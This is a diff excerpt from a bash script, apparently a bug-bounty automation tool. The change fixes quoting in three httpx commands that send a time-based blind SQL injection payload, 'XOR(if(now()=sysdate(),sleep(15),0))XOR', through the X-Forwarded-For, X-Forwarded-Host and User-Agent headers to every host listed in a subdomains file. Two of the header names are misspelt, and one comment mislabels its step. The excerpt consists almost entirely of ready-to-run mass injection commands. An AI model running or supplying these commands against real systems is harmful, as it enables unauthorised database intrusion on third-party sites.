@@ -66,17 +66,17 @@ echo -e "${CYAN}Task Completed!${RESET}"
 
 # Running SQLi X-Forwarded-For
 echo -e "${GREEN}Running SQLi attack using X-Forwarded-For...${RESET}"
-cat subdomains.txt | httpx -silent -H "X-Forwraded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10'" > SQLi-X-Forwarded-For.txt
+cat subdomains.txt | httpx -silent -H "X-Forwraded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > SQLi-X-Forwarded-For.txt
 echo -e "${CYAN}Task Completed!${RESET}"
 
 # Running SQLi X-Forwarded-Host
 echo -e "${GREEN}Running SQLi attack using X-Forwarded-Host...${RESET}"
-cat subdomains.txt | httpx -silent -H "X-Forwraded-Hostr:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10'" > SQLi-X-Forwarded-Host.txt
+cat subdomains.txt | httpx -silent -H "X-Forwraded-Hostr:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > SQLi-X-Forwarded-Host.txt
 echo -e "${CYAN}Task Completed!${RESET}"
 
 # Running SQLi X-Forwarded-Host
 echo -e "${GREEN}Running SQLi attack using User-Agent...${RESET}"
-cat subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10'" > SQLi-User-Agent.txt
+cat subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > SQLi-User-Agent.txt
 echo -e "${CYAN}Task Completed!${RESET}"
 
 
